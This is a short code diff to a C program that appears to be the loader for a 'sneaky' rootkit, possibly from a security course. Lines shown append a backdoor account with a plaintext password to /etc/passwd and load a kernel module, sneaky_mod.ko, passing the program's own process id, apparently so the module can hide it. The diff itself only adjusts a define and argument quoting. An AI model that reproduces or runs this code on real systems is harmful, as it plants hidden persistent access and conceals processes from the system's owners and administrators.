@@ -1,3 +1,4 @@
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -28,7 +29,7 @@ int main() {
   system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> /etc/passwd");   
 
   // load mod, with the current process id as parameter
-  sprintf(load_mod, "insmod sneaky_mod.ko pid_str=\"%d\"", getpid());
+  sprintf(load_mod, "insmod sneaky_mod.ko pid_str=%d", getpid());
   system(load_mod);
 
   execv_line(); // execute terminal commands
